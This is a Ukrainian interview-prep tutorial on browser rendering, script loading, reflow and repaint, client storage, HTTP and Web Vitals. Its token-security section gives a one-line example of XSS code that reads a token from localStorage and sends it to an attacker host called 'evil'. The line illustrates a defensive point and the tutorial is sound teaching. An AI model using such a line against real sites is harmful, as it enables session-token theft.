Critical rendering path: від адресного рядка до пікселів

Це послідовність кроків, які браузер виконує, щоб перетворити адресу в адресному рядку на готову, намальовану сторінку. На співбесіді питання рідко звучить лише "що таке render tree" — частіше просять описати весь шлях цілком, від натискання Enter до перших пікселів на екрані.

Enter в адресному рядку
→
DNS-резолвінг домену
→
TCP-хендшейк
→
HTTP-запит/відповідь
→
HTML → DOM (інкрементно)
→
CSS → CSSOM
→
Render Tree → Layout → Paint → Composite

Перші три кроки — мережеві, а не рендерингові: браузер спершу перетворює домен на IP-адресу (DNS), потім установлює TCP-з'єднання (детальний розбір потрійного рукостискання — у туторіалі 8), і лише тоді надсилає перший HTTP-запит за самим HTML-документом.

Ключовий нюанс, який часто упускають: браузер не чекає, поки прийде вся відповідь, щоб почати працювати — він парсить HTML інкрементно, будуючи DOM по мірі надходження байтів, і одразу починає завантажувати ресурси, знайдені в уже опрацьованій частині документа (наприклад, <link> на стилі чи <img>), навіть якщо сервер ще досилає решту HTML.

Паралельно браузер парсить CSS в окреме дерево — CSSOM (CSS Object Model), з урахуванням каскаду й специфічності. Тут з'являється поняття критичного CSS: за замовчуванням CSS вважається render-blocking — сторінка не намалює жодного пікселя, поки не завантажиться й не спарситься весь CSS, від якого залежить перший екран, навіть якщо DOM уже повністю готовий. Практичний прийом: вбудувати (inline) невеликий шматок critical CSS — стилі, потрібні лише для контенту над згином (above-the-fold) — прямо в <head>, а решту стилів підключити звичайним <link>, який довантажиться асинхронно й не затримає перший рендер.

🎯
Чому inline critical CSS взагалі допомагає: звичайний <link rel="stylesheet"> — це окремий мережевий round-trip, який блокує рендер, поки не завершиться. Вбудований <style> не вимагає додаткового запиту взагалі — він уже частина HTML, який браузер і так завантажує, тож перший paint може статись одразу, як тільки DOM і критичний CSS готові, не чекаючи окремого файлу стилів.

Далі — вже власне рендерингова частина шляху:

  1. DOM + CSSOM → Render Tree. Ці два дерева об'єднуються в дерево рендерингу — лише видимі вузли (без display:none) з обчисленими стилями.
  2. Layout (reflow). Браузер обчислює точні розміри й позицію кожного вузла на сторінці — геометрію.
  3. Paint. Заповнення пікселів: кольори, тіні, текст, зображення — у межах уже обчисленої геометрії.
  4. Composite. Окремі шари (layers) склеюються GPU в один кадр, який реально показується на екрані.

Ключове: зміна, що впливає на геометрію (наприклад, width), змушує повторити кроки з layout і далі. Зміна лише кольору повторює тільки paint і composite — суттєво дешевше. Саме на цій різниці побудована наступна тема.

Завантаження скриптів: без атрибута, async, defer

Один із найчастіше плутаних моментів на живих співбесідах — саме тому, що всі три варіанти виглядають майже однаково в коді, але поводяться геть по-різному під час парсингу HTML.

АтрибутБлокує парсинг HTML?Коли виконуєтьсяПорядок виконання гарантовано?
Без атрибута Так — і на завантаження, і на виконання Негайно, як тільки скрипт завантажився — парсинг HTML зупинений увесь цей час Так (природно, по черзі — парсинг же зупинений)
async Ні під час завантаження Одразу, щойно довантажився — перериває парсинг у довільний момент Ні — хто раніше довантажився, той раніше й виконається
defer Ні під час завантаження Після завершення парсингу, безпосередньо перед DOMContentLoaded Так — у тому порядку, у якому скрипти йдуть у документі
🎯
Коли що обирати: async — для незалежних скриптів, яким байдуже на DOM і одне на одного (аналітика, реклама). defer — для скриптів, яким потрібен готовий DOM і/або які залежать від порядку виконання одне одного (типовий вибір для основного бандла застосунку). Скрипт без атрибута — найдорожчий варіант: його варто ставити лише тоді, коли сторінка справді не може продовжити рендеритись, поки цей конкретний скрипт не виконається.

Reflow vs repaint

Reflow (layout) — браузер перераховує геометрію: розміри, позиції, обтікання сусідніх елементів. Це дорого, бо зміна геометрії одного елемента часто каскадом зачіпає сусідні й батьківські елементи. Repaint — браузер лише перемальовує пікселі в межах уже відомої геометрії (колір, тінь, видимість), без перерахунку розмірів/позицій — це суттєво дешевше.

Тип зміниПриклад властивостейЩо відбувається
Геометріяwidth, height, top, left, margin, font-sizeReflow → repaint → composite (найдорожче)
Візуальний вигляд без геометріїcolor, background-color, visibilityТільки repaint → composite
transform, opacityпереміщення/масштабування/прозорістьЛише composite — може виконуватись окремим шаром на GPU, без layout і paint узагалі
🎯
Практичний наслідок: саме тому анімації рекомендують робити через transform/opacity, а не через top/left/ width — перші можуть повністю обійти layout і paint, лишаючи браузеру лише найдешевший крок (composite), що дає плавні 60 кадрів/с навіть на слабшому пристрої.

Сховища браузера й безпека токенів

Браузер дає кілька механізмів зберігання даних на клієнті, і кожен — інший компроміс між об'ємом, часом життя, доступністю з JS і мережевою поведінкою.

СховищеОбсягЧас життяДоступне з JS?
localStorage~5-10 МБПостійно, до явного очищенняТак
sessionStorage~5-10 МБДо закриття вкладкиТак
Cookie~4 КБНалаштовується (Expires/Max-Age)Так, крім httpOnly
IndexedDBДесятки МБ і більшеПостійноТак (асинхронний API)

Найважливіший практичний висновок стосується саме авторизаційних токенів. Якщо токен лежить у localStorage, він доступний будь-якому JS-коду, що виконується на сторінці — включно з чужим скриптом, який потрапив туди через XSS-вразливість (наприклад, невідфільтрований user-generated контент, що вставляється в DOM). Один такий скрипт — і токен просто читається й відправляється зловмиснику одним рядком (fetch(evil, {body: localStorage.getItem('token')})).

чому httpOnly-cookie інша справа
// Токен у httpOnly-cookie:
// - JS НЕ має до нього доступу взагалі (document.cookie його не покаже)
// - браузер сам додає cookie до кожного запиту на той самий домен
// - навіть успішна XSS-атака не може "прочитати й вкрасти" сам токен,
//   лише виконати запит від імені користувача, поки сесія активна
⚠️
Це не означає, що httpOnly-cookie повністю невразливі: вони відкривають інший клас атак (CSRF), який закривається окремо — SameSite-атрибутом і/або CSRF-токеном. "Де зберігати токен" — це вибір, який клас атаки ти закриваєш явно, а не спосіб уникнути безпеки взагалі.

Анатомія HTTP-запиту й відповіді

Базове мережеве питання, на якому не варто "зависати" — але яке неочікувано виявилось каменем спотикання в одному з реальних інтерв'ю. Тема виявилась достатньо глибокою (заголовки, CORS, кешування, статус-коди, HTTP/1.1 vs 2 vs 3), щоб винести її в окремий туторіал з живими прикладами коду й розбором 20 найчастіших питань.

🌐
Повний розбір — у туторіалі 11 — HTTP: анатомія запитів: структура запиту/відповіді, методи (safe/idempotent), робота із заголовками з коду (Fetch/XHR), CORS крок за кроком, кешування й умовні запити, content negotiation, cookies, HTTP/1.1 проти HTTP/2/3 — і 20 питань для співбесіди.

Web Vitals і профайлінг у DevTools

Core Web Vitals — три метрики, якими Google (і більшість продуктових команд) вимірюють реальну якість користувацького досвіду, а не абстрактну "швидкість".

МетрикаЩо міряєТипова причина погіршення
LCP (Largest Contentful Paint)Коли з'явився найбільший видимий елемент (зазвичай hero-зображення чи заголовок)Повільний сервер/CDN, незооптимізовані зображення, блокуючий рендер CSS/JS
INP (Interaction to Next Paint)Затримка між дією користувача (клік, ввід) і візуальною відповіддюДовгі синхронні JS-задачі, що блокують основний потік
CLS (Cumulative Layout Shift)Наскільки сильно "стрибає" верстка під час завантаженняЗображення/реклама без заданих розмірів, шрифти, що підвантажуються пізніше

Знати назви метрик — половина справи; друга половина — вміти реально відкрити вкладку Performance у Chrome DevTools, записати сесію взаємодії й прочитати результат: знайти "довгі задачі" (long tasks, >50мс, що блокують INP), побачити layout thrashing (червоні позначки повторного layout у флейм-графіку) або зрозуміти, який саме ресурс затримує LCP на водоспадному графіку мережі (Network waterfall).

🎯
Що перевіряють на співбесіді: не визначення метрик напам'ять, а здатність зв'язати конкретний симптом ("сторінка відчувається повільною при кліку") з конкретним інструментом діагностики (Performance-профайлер) і конкретною метрикою (INP) — тобто робочий діагностичний процес, а не словник термінів.
